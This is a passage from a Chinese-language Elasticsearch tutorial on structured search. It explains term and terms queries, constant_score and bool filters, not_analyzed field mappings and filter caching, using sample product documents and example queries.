<p>理解每个查询如何贡献相关度评分 _score 有助于调试我们的查询：确保我们认为的最佳匹配文档出现在结果首页，以及削减结果中几乎不相关的 “长尾（long tail）”。</p>
<p>搜索不仅仅是全文搜索：我们很大一部分数据都是结构化的，如日期和数字。 我们会以说明结构化搜索与全文搜索最高效的结合方式开始本章的内容。</p>
<h1 id="结构化搜索"><a href="#结构化搜索" class="headerlink" title="结构化搜索"></a>结构化搜索</h1><p>结构化搜索（Structured search） 是指有关探询那些具有内在结构数据的过程。比如日期、时间和数字都是结构化的：它们有精确的格式，我们可以对这些格式进行逻辑操作。比较常见的操作包括比较数字或时间的范围，或判定两个值的大小。</p>
<p>文本也可以是结构化的。如彩色笔可以有离散的颜色集合： 红（red） 、 绿（green） 、 蓝（blue） 。一个博客可能被标记了关键词 分布式（distributed） 和 搜索（search） 。电商网站上的商品都有 UPCs（通用产品码 Universal Product Codes）或其他的唯一标识，它们都需要遵从严格规定的、结构化的格式。</p>
<p>在结构化查询中，我们得到的结果 总是 非是即否，要么存于集合之中，要么存在集合之外。结构化查询不关心文件的相关度或评分；它简单的对文档包括或排除处理。</p>
<p>这在逻辑上是能说通的，因为一个数字不能比其他数字 更 适合存于某个相同范围。结果只能是：存于范围之中，抑或反之。同样，对于结构化文本来说，一个值要么相等，要么不等。没有 更似 这种概念。</p>
<h1 id="精确值查找"><a href="#精确值查找" class="headerlink" title="精确值查找"></a>精确值查找</h1><p>当进行精确值查找时， 我们会使用过滤器（filters）。过滤器很重要，因为它们执行速度非常快，不会计算相关度（直接跳过了整个评分阶段）而且很容易被缓存。我们会在本章后面的 过滤器缓存 中讨论过滤器的性能优势，不过现在只要记住：请尽可能多的使用过滤式查询。</p>
<h2 id="term-查询数字"><a href="#term-查询数字" class="headerlink" title="term 查询数字"></a>term 查询数字</h2><p>我们首先来看最为常用的 term 查询， 可以用它处理数字（numbers）、布尔值（Booleans）、日期（dates）以及文本（text）。</p>
<p>让我们以下面的例子开始介绍，创建并索引一些表示产品的文档，文档里有字段 <code>price</code> 和 <code>productID</code> （ <code>价格</code> 和 <code>产品ID</code> ）：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /my_store/products/_bulk</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123; <span class="string">"_id"</span>: 1 &#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 10, <span class="string">"productID"</span> : <span class="string">"XHDK-A-1293-#fJ3"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123; <span class="string">"_id"</span>: 2 &#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 20, <span class="string">"productID"</span> : <span class="string">"KDKE-B-9947-#kL5"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123; <span class="string">"_id"</span>: 3 &#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 30, <span class="string">"productID"</span> : <span class="string">"JODL-X-1937-#pV7"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123; <span class="string">"_id"</span>: 4 &#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 30, <span class="string">"productID"</span> : <span class="string">"QQPX-R-3956-#aD8"</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>我们想要做的是查找具有某个价格的所有产品，有关系数据库背景的人肯定熟悉 SQL，如果我们将其用 SQL 形式表达，会是下面这样：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">document</span></span><br><span class="line"><span class="keyword">FROM</span>   products</span><br><span class="line"><span class="keyword">WHERE</span>  price = <span class="number">20</span></span><br></pre></td></tr></table></figure></p>
<p>在 Elasticsearch 的查询表达式（query DSL）中，我们可以使用 term 查询达到相同的目的。 term 查询会查找我们指定的精确值。作为其本身， term 查询是简单的。它接受一个字段名以及我们希望查找的数值：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"term"</span> : &#123;</span><br><span class="line">        <span class="attr">"price"</span> : <span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通常当查找一个精确值的时候，我们不希望对查询进行评分计算。只希望对文档进行包括或排除的计算，所以我们会使用 constant_score 查询以非评分模式来执行 term 查询并以一作为统一评分。</p>
<p>最终组合的结果是一个 constant_score 查询，它包含一个 term 查询：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /my_store/products/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span> : &#123;</span><br><span class="line">        <span class="string">"constant_score"</span> : &#123; (1)</span><br><span class="line">            <span class="string">"filter"</span> : &#123;</span><br><span class="line">                <span class="string">"term"</span> : &#123; (2)</span><br><span class="line">                    <span class="string">"price"</span> : 20</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>(1)我们用 constant_score 将 term 查询转化成为过滤器<br>(2)我们之前看到过的 term 查询<br>执行后，这个查询所搜索到的结果与我们期望的一致：只有文档 2 命中并作为结果返回（因为只有 2 的价格是 20 ）:<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"hits" : [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"_index"</span> : <span class="string">"my_store"</span>,</span><br><span class="line">        <span class="attr">"_type"</span> :  <span class="string">"products"</span>,</span><br><span class="line">        <span class="attr">"_id"</span> :    <span class="string">"2"</span>,</span><br><span class="line">        <span class="attr">"_score"</span> : <span class="number">1.0</span>, <span class="comment">//(1)</span></span><br><span class="line">        <span class="attr">"_source"</span> : &#123;</span><br><span class="line">          <span class="attr">"price"</span> :     <span class="number">20</span>,</span><br><span class="line">          <span class="attr">"productID"</span> : <span class="string">"KDKE-B-9947-#kL5"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<p>(1)查询置于 filter 语句内不进行评分或相关度的计算，所以所有的结果都会返回一个默认评分 1 。</p>
<h2 id="term-查询文本"><a href="#term-查询文本" class="headerlink" title="term 查询文本"></a>term 查询文本</h2><p>如本部分开始处提到过的一样 ，使用 term 查询匹配字符串和匹配数字一样容易。如果我们想要查询某个具体 UPC ID 的产品，使用 SQL 表达式会是如下这样：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> product</span><br><span class="line"><span class="keyword">FROM</span>   products</span><br><span class="line"><span class="keyword">WHERE</span>  productID = <span class="string">"XHDK-A-1293-#fJ3"</span></span><br></pre></td></tr></table></figure></p>
<p>转换成查询表达式（query DSL），同样使用 term 查询，形式如下：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /my_store/products/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span> : &#123;</span><br><span class="line">        <span class="string">"constant_score"</span> : &#123;</span><br><span class="line">            <span class="string">"filter"</span> : &#123;</span><br><span class="line">                <span class="string">"term"</span> : &#123;</span><br><span class="line">                    <span class="string">"productID"</span> : <span class="string">"XHDK-A-1293-#fJ3"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>但这里有个小问题：我们无法获得期望的结果。为什么呢？问题不在 term 查询，而在于索引数据的方式。 如果我们使用 analyze API (分析 API)，我们可以看到这里的 UPC 码被拆分成多个更小的 token ：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /my_store/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"field"</span>: <span class="string">"productID"</span>,</span><br><span class="line">  <span class="string">"text"</span>: <span class="string">"XHDK-A-1293-#fJ3"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokens"</span> : [ &#123;</span><br><span class="line">    <span class="attr">"token"</span> :        <span class="string">"xhdk"</span>,</span><br><span class="line">    <span class="attr">"start_offset"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"end_offset"</span> :   <span class="number">4</span>,</span><br><span class="line">    <span class="attr">"type"</span> :         <span class="string">"&lt;ALPHANUM&gt;"</span>,</span><br><span class="line">    <span class="attr">"position"</span> :     <span class="number">1</span></span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    <span class="attr">"token"</span> :        <span class="string">"a"</span>,</span><br><span class="line">    <span class="attr">"start_offset"</span> : <span class="number">5</span>,</span><br><span class="line">    <span class="attr">"end_offset"</span> :   <span class="number">6</span>,</span><br><span class="line">    <span class="attr">"type"</span> :         <span class="string">"&lt;ALPHANUM&gt;"</span>,</span><br><span class="line">    <span class="attr">"position"</span> :     <span class="number">2</span></span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    <span class="attr">"token"</span> :        <span class="string">"1293"</span>,</span><br><span class="line">    <span class="attr">"start_offset"</span> : <span class="number">7</span>,</span><br><span class="line">    <span class="attr">"end_offset"</span> :   <span class="number">11</span>,</span><br><span class="line">    <span class="attr">"type"</span> :         <span class="string">"&lt;NUM&gt;"</span>,</span><br><span class="line">    <span class="attr">"position"</span> :     <span class="number">3</span></span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    <span class="attr">"token"</span> :        <span class="string">"fj3"</span>,</span><br><span class="line">    <span class="attr">"start_offset"</span> : <span class="number">13</span>,</span><br><span class="line">    <span class="attr">"end_offset"</span> :   <span class="number">16</span>,</span><br><span class="line">    <span class="attr">"type"</span> :         <span class="string">"&lt;ALPHANUM&gt;"</span>,</span><br><span class="line">    <span class="attr">"position"</span> :     <span class="number">4</span></span><br><span class="line">  &#125; ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有几点需要注意：</p>
<ol>
<li>Elasticsearch 用 4 个不同的 token 而不是单个 token 来表示这个 UPC 。</li>
<li>所有字母都是小写的。</li>
<li>丢失了连字符和哈希符（ # ）。</li>
</ol>
<p>所以当我们用 term 查询查找精确值 XHDK-A-1293-#fJ3 的时候，找不到任何文档，因为它并不在我们的倒排索引中，正如前面呈现出的分析结果，索引里有四个 token 。</p>
<p>显然这种对 ID 码或其他任何精确值的处理方式并不是我们想要的。</p>
<p>为了避免这种问题，我们需要告诉 Elasticsearch 该字段具有精确值，要将其设置成 not_analyzed 无需分析的。 我们可以在 自定义字段映射 中查看它的用法。为了修正搜索结果，我们需要首先删除旧索引（因为它的映射不再正确）然后创建一个能正确映射的新索引：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">DELETE /my_store (1)</span><br><span class="line"></span><br><span class="line">PUT /my_store (2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"mappings"</span> : &#123;</span><br><span class="line">        <span class="string">"products"</span> : &#123;</span><br><span class="line">            <span class="string">"properties"</span> : &#123;</span><br><span class="line">                <span class="string">"productID"</span> : &#123;</span><br><span class="line">                    <span class="string">"type"</span> : <span class="string">"string"</span>,</span><br><span class="line">                    <span class="string">"index"</span> : <span class="string">"not_analyzed"</span> (3)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>(1) 删除索引是必须的，因为我们不能更新已存在的映射。<br>(2) 在索引被删除后，我们可以创建新的索引并为其指定自定义映射。<br>(3) 这里我们告诉 Elasticsearch ，我们不想对 productID 做任何分析。</p>
<p>现在我们可以为文档重建索引：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /my_store/products/_bulk</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123; <span class="string">"_id"</span>: 1 &#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 10, <span class="string">"productID"</span> : <span class="string">"XHDK-A-1293-#fJ3"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123; <span class="string">"_id"</span>: 2 &#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 20, <span class="string">"productID"</span> : <span class="string">"KDKE-B-9947-#kL5"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123; <span class="string">"_id"</span>: 3 &#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 30, <span class="string">"productID"</span> : <span class="string">"JODL-X-1937-#pV7"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123; <span class="string">"_id"</span>: 4 &#125;&#125;</span><br><span class="line">&#123; <span class="string">"price"</span> : 30, <span class="string">"productID"</span> : <span class="string">"QQPX-R-3956-#aD8"</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>此时， term 查询就能搜索到我们想要的结果，让我们再次搜索新索引过的数据（注意，查询和过滤并没有发生任何改变，改变的是数据映射的方式）：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /my_store/products/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span> : &#123;</span><br><span class="line">        <span class="string">"constant_score"</span> : &#123;</span><br><span class="line">            <span class="string">"filter"</span> : &#123;</span><br><span class="line">                <span class="string">"term"</span> : &#123;</span><br><span class="line">                    <span class="string">"productID"</span> : <span class="string">"XHDK-A-1293-#fJ3"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为 productID 字段是未分析过的， term 查询不会对其做任何分析，查询会进行精确查找并返回文档 1 。成功！</p>
<h2 id="内部过滤器的操作"><a href="#内部过滤器的操作" class="headerlink" title="内部过滤器的操作"></a>内部过滤器的操作</h2><p>在内部，Elasticsearch 会在运行非评分查询的时执行多个操作：</p>
<ol>
<li>查找匹配文档.<br>term 查询在倒排索引中查找 XHDK-A-1293-#fJ3 然后获取包含该 term 的所有文档。本例中，只有文档 1 满足我们要求。</li>
<li>创建 bitset.<br>过滤器会创建一个 bitset （一个包含 0 和 1 的数组），它描述了哪个文档会包含该 term 。匹配文档的标志位是 1 。本例中，bitset 的值为 [1,0,0,0] 。在内部，它表示成一个 “roaring bitmap”，可以同时对稀疏或密集的集合进行高效编码。</li>
<li>迭代 bitset(s)<br>一旦为每个查询生成了 bitsets ，Elasticsearch 就会循环迭代 bitsets 从而找到满足所有过滤条件的匹配文档的集合。执行顺序是启发式的，但一般来说先迭代稀疏的 bitset （因为它可以排除掉大量的文档）。</li>
<li>增量使用计数.<br>Elasticsearch 能够缓存非评分查询从而获取更快的访问，但是它也会不太聪明地缓存一些使用极少的东西。非评分计算因为倒排索引已经足够快了，所以我们只想缓存那些我们 知道 在将来会被再次使用的查询，以避免资源的浪费。</li>
</ol>
<p>为了实现以上设想，Elasticsearch 会为每个索引跟踪保留查询使用的历史状态。如果查询在最近的 256 次查询中会被用到，那么它就会被缓存到内存中。当 bitset 被缓存后，缓存会在那些低于 10,000 个文档（或少于 3% 的总索引数）的段（segment）中被忽略。这些小的段即将会消失，所以为它们分配缓存是一种浪费。</p>
<p>实际情况并非如此（执行有它的复杂性，这取决于查询计划是如何重新规划的，有些启发式的算法是基于查询代价的），理论上非评分查询 先于 评分查询执行。非评分查询任务旨在降低那些将对评分查询计算带来更高成本的文档数量，从而达到快速搜索的目的。</p>
<p>从概念上记住非评分计算是首先执行的，这将有助于写出高效又快速的搜索请求。</p>
<h1 id="组合过滤器"><a href="#组合过滤器" class="headerlink" title="组合过滤器"></a>组合过滤器</h1><p>前面的两个例子都是单个过滤器（filter）的使用方式。 在实际应用中，我们很有可能会过滤多个值或字段。比方说，怎样用 Elasticsearch 来表达下面的 SQL ？<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> product</span><br><span class="line"><span class="keyword">FROM</span>   products</span><br><span class="line"><span class="keyword">WHERE</span>  (price = <span class="number">20</span> <span class="keyword">OR</span> productID = <span class="string">"XHDK-A-1293-#fJ3"</span>)</span><br><span class="line">  <span class="keyword">AND</span>  (price != <span class="number">30</span>)</span><br></pre></td></tr></table></figure></p>
<p>这种情况下，我们需要 bool （布尔）过滤器。 这是个 复合过滤器（compound filter） ，它可以接受多个其他过滤器作为参数，并将这些过滤器结合成各式各样的布尔（逻辑）组合。</p>
<h2 id="布尔过滤器"><a href="#布尔过滤器" class="headerlink" title="布尔过滤器"></a>布尔过滤器</h2><p>一个 bool 过滤器由三部分组成：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"bool"</span> : &#123;</span><br><span class="line">      <span class="attr">"must"</span> :     [],</span><br><span class="line">      <span class="attr">"should"</span> :   [],</span><br><span class="line">      <span class="attr">"must_not"</span> : [],</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>must<br>所有的语句都 必须（must） 匹配，与 AND 等价。<br>must_not<br>所有的语句都 不能（must not） 匹配，与 NOT 等价。<br>should<br>至少有一个语句要匹配，与 OR 等价。</p>
<p>就这么简单！ 当我们需要多个过滤器时，只须将它们置入 bool 过滤器的不同部分即可。</p>
<p>一个 bool 过滤器的每个部分都是可选的（例如，我们可以只有一个 must 语句），而且每个部分内部可以只有一个或一组过滤器。</p>
<p>用 Elasticsearch 来表示本部分开始处的 SQL 例子，将两个 term 过滤器置入 bool 过滤器的 should 语句内，再增加一个语句处理 NOT 非的条件：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /my_store/products/_search</span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">"query"</span> : &#123;</span><br><span class="line">      <span class="string">"filtered"</span> : &#123; (1)</span><br><span class="line">         <span class="string">"filter"</span> : &#123;</span><br><span class="line">            <span class="string">"bool"</span> : &#123;</span><br><span class="line">              <span class="string">"should"</span> : [</span><br><span class="line">                 &#123; <span class="string">"term"</span> : &#123;<span class="string">"price"</span> : 20&#125;&#125;, (2)</span><br><span class="line">                 &#123; <span class="string">"term"</span> : &#123;<span class="string">"productID"</span> : <span class="string">"XHDK-A-1293-#fJ3"</span>&#125;&#125; (3)</span><br><span class="line">              ],</span><br><span class="line">              <span class="string">"must_not"</span> : &#123;</span><br><span class="line">                 <span class="string">"term"</span> : &#123;<span class="string">"price"</span> : 30&#125; (4)</span><br><span class="line">              &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>(1) 注意，我们仍然需要一个 filtered 查询将所有的东西包起来。<br>(2)(3) 在 should 语句块里面的两个 term 过滤器与 bool 过滤器是父子关系，两个 term 条件需要匹配其一。<br>(4) 如果一个产品的价格是 30 ，那么它会自动被排除，因为它处于 must_not 语句里面。</p>
<p>我们搜索的结果返回了 2 个命中结果，两个文档分别匹配了 bool 过滤器其中的一个条件：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="string">"hits"</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"_id"</span> :     <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"_score"</span> :  1.0,</span><br><span class="line">        <span class="string">"_source"</span> : &#123;</span><br><span class="line">          <span class="string">"price"</span> :     10,</span><br><span class="line">          <span class="string">"productID"</span> : <span class="string">"XHDK-A-1293-#fJ3"</span> (1)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"_id"</span> :     <span class="string">"2"</span>,</span><br><span class="line">        <span class="string">"_score"</span> :  1.0,</span><br><span class="line">        <span class="string">"_source"</span> : &#123;</span><br><span class="line">          <span class="string">"price"</span> :     20, (2)</span><br><span class="line">          <span class="string">"productID"</span> : <span class="string">"KDKE-B-9947-#kL5"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<p>(1) 与 term 过滤器中 productID = “XHDK-A-1293-#fJ3” 条件匹配<br>(2) 与 term 过滤器中 price = 20 条件匹配</p>
<h1 id="嵌套布尔过滤器"><a href="#嵌套布尔过滤器" class="headerlink" title="嵌套布尔过滤器"></a>嵌套布尔过滤器</h1><p>尽管 bool 是一个复合的过滤器，可以接受多个子过滤器，需要注意的是 bool 过滤器本身仍然还只是一个过滤器。 这意味着我们可以将一个 bool 过滤器置于其他 bool 过滤器内部，这为我们提供了对任意复杂布尔逻辑进行处理的能力。</p>
<p>对于以下这个 SQL 语句：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">document</span></span><br><span class="line"><span class="keyword">FROM</span>   products</span><br><span class="line"><span class="keyword">WHERE</span>  productID      = <span class="string">"KDKE-B-9947-#kL5"</span></span><br><span class="line">  <span class="keyword">OR</span> (     productID = <span class="string">"JODL-X-1937-#pV7"</span></span><br><span class="line">       <span class="keyword">AND</span> price     = <span class="number">30</span> )</span><br></pre></td></tr></table></figure></p>
<p>我们将其转换成一组嵌套的 bool 过滤器：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /my_store/products/_search</span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">"query"</span> : &#123;</span><br><span class="line">      <span class="string">"filtered"</span> : &#123;</span><br><span class="line">         <span class="string">"filter"</span> : &#123;</span><br><span class="line">            <span class="string">"bool"</span> : &#123;</span><br><span class="line">              <span class="string">"should"</span> : [</span><br><span class="line">                &#123; <span class="string">"term"</span> : &#123;<span class="string">"productID"</span> : <span class="string">"KDKE-B-9947-#kL5"</span>&#125;&#125;, (1)</span><br><span class="line">                &#123; <span class="string">"bool"</span> : &#123; (2)</span><br><span class="line">                  <span class="string">"must"</span> : [</span><br><span class="line">                    &#123; <span class="string">"term"</span> : &#123;<span class="string">"productID"</span> : <span class="string">"JODL-X-1937-#pV7"</span>&#125;&#125;, (3)</span><br><span class="line">                    &#123; <span class="string">"term"</span> : &#123;<span class="string">"price"</span> : 30&#125;&#125; (4)</span><br><span class="line">                  ]</span><br><span class="line">                &#125;&#125;</span><br><span class="line">              ]</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>(1)(2) 因为 term 和 bool 过滤器是兄弟关系，他们都处于外层的布尔逻辑 should 的内部，返回的命中文档至少须匹配其中一个过滤器的条件。<br>(3)(4) 这两个 term 语句作为兄弟关系，同时处于 must 语句之中，所以返回的命中文档要必须都能同时匹配这两个条件。</p>
<p>得到的结果有两个文档，它们各匹配 should 语句中的一个条件：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"hits" : [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"_id"</span> :     <span class="string">"2"</span>,</span><br><span class="line">        <span class="attr">"_score"</span> :  <span class="number">1.0</span>,</span><br><span class="line">        <span class="attr">"_source"</span> : &#123;</span><br><span class="line">          <span class="attr">"price"</span> :     <span class="number">20</span>,</span><br><span class="line">          <span class="attr">"productID"</span> : <span class="string">"KDKE-B-9947-#kL5"</span> <span class="comment">// (1)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"_id"</span> :     <span class="string">"3"</span>,</span><br><span class="line">        <span class="attr">"_score"</span> :  <span class="number">1.0</span>,</span><br><span class="line">        <span class="attr">"_source"</span> : &#123;</span><br><span class="line">          <span class="attr">"price"</span> :      <span class="number">30</span>, <span class="comment">// (2)</span></span><br><span class="line">          <span class="attr">"productID"</span> : <span class="string">"JODL-X-1937-#pV7"</span> <span class="comment">// (3)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<p>(1) 这个 productID 与外层的 bool 过滤器 should 里的唯一一个 term 匹配。<br>(2) 这两个字段与嵌套的 bool 过滤器 must 里的两个 term 匹配。</p>
<p>这只是个简单的例子，但足以展示布尔过滤器可以用来作为构造复杂逻辑条件的基本构建模块。</p>
<h1 id="查找多个精确值"><a href="#查找多个精确值" class="headerlink" title="查找多个精确值"></a>查找多个精确值</h1><p>term 查询对于查找单个值非常有用，但通常我们可能想搜索多个值。 如果我们想要查找价格字段值为 $20 或 $30 的文档该如何处理呢？</p>
<p>不需要使用多个 term 查询，我们只要用单个 terms 查询（注意末尾的 s ）， terms 查询好比是 term 查询的复数形式（以英语名词的单复数做比）。</p>
<p>它几乎与 term 的使用方式一模一样，与指定单个价格不同，我们只要将 term 字段的值改为数组即可：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"terms"</span> : &#123;</span><br><span class="line">        <span class="attr">"price"</span> : [<span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>与 term 查询一样，也需要将其置入 filter 语句的常量评分查询中使用：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /my_store/products/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span> : &#123;</span><br><span class="line">        <span class="string">"constant_score"</span> : &#123;</span><br><span class="line">            <span class="string">"filter"</span> : &#123;</span><br><span class="line">                <span class="string">"terms"</span> : &#123; (1)</span><br><span class="line">                    <span class="string">"price"</span> : [20, 30]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>(1) 这个 terms 查询被置于 constant_score 查询中</p>
<p>运行结果返回第二、第三和第四个文档：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"hits" : [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"_id"</span> :    <span class="string">"2"</span>,</span><br><span class="line">        <span class="attr">"_score"</span> : <span class="number">1.0</span>,</span><br><span class="line">        <span class="attr">"_source"</span> : &#123;</span><br><span class="line">          <span class="attr">"price"</span> :     <span class="number">20</span>,</span><br><span class="line">          <span class="attr">"productID"</span> : <span class="string">"KDKE-B-9947-#kL5"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"_id"</span> :    <span class="string">"3"</span>,</span><br><span class="line">        <span class="attr">"_score"</span> : <span class="number">1.0</span>,</span><br><span class="line">        <span class="attr">"_source"</span> : &#123;</span><br><span class="line">          <span class="attr">"price"</span> :     <span class="number">30</span>,</span><br><span class="line">          <span class="attr">"productID"</span> : <span class="string">"JODL-X-1937-#pV7"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"_id"</span>:     <span class="string">"4"</span>,</span><br><span class="line">        <span class="attr">"_score"</span>:  <span class="number">1.0</span>,</span><br><span class="line">        <span class="attr">"_source"</span>: &#123;</span><br><span class="line">           <span class="attr">"price"</span>:     <span class="number">30</span>,</span><br><span class="line">           <span class="attr">"productID"</span>: <span class="string">"QQPX-R-3956-#aD8"</span></span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<h2 id="包含，而不是相等"><a href="#包含，而不是相等" class="headerlink" title="包含，而不是相等"></a>包含，而不是相等</h2><p>一定要了解 term 和 terms 是 包含（contains） 操作，而非 等值（equals） （判断）。 如何理解这句话呢？</p>
<p>如果我们有一个 term（词项）过滤器 { “term” : { “tags” : “search” } } ，它会与以下两个文档 同时 匹配：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">"tags"</span> : [<span class="string">"search"</span>] &#125;</span><br><span class="line">&#123; "tags" : ["search", "open_source"] &#125; (1)</span><br></pre></td></tr></table></figure>
<p>(1) 尽管第二个文档包含除 search 以外的其他词，它还是被匹配并作为结果返回。</p>
<p>回忆一下 term 查询是如何工作的？ Elasticsearch 会在倒排索引中查找包括某 term 的所有文档，然后构造一个 bitset 。在我们的例子中，倒排索引表如下：<br>Token       DocIDs<br>open_source 2<br>search      1,2<br>当 term 查询匹配标记 search 时，它直接在倒排索引中找到记录并获取相关的文档 ID，如倒排索引所示，这里文档 1 和文档 2 均包含该标记，所以两个文档会同时作为结果返回。</p>
<p>由于倒排索引表自身的特性，整个字段是否相等会难以计算，如果确定某个特定文档是否 只（only） 包含我们想要查找的词呢？首先我们需要在倒排索引中找到相关的记录并获取文档 ID，然后再扫描 倒排索引中的每行记录 ，查看它们是否包含其他的 terms 。</p>
<p>可以想象，这样不仅低效，而且代价高昂。正因如此， term 和 terms 是 必须包含（must contain） 操作，而不是 必须精确相等（must equal exactly） 。</p>
<h2 id="精确相等"><a href="#精确相等" class="headerlink" title="精确相等"></a>精确相等</h2><p>如果一定期望得到我们前面说的那种行为（即整个字段完全相等），最好的方式是增加并索引另一个字段， 这个字段用以存储该字段包含词项的数量，同样以上面提到的两个文档为例，现在我们包括了一个维护标签数的新字段：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">"tags"</span> : [<span class="string">"search"</span>], <span class="attr">"tag_count"</span> : <span class="number">1</span> &#125;</span><br><span class="line">&#123; <span class="attr">"tags"</span> : [<span class="string">"search"</span>, <span class="string">"open_source"</span>], <span class="attr">"tag_count"</span> : <span class="number">2</span> &#125;</span><br></pre></td></tr></table></figure></p>
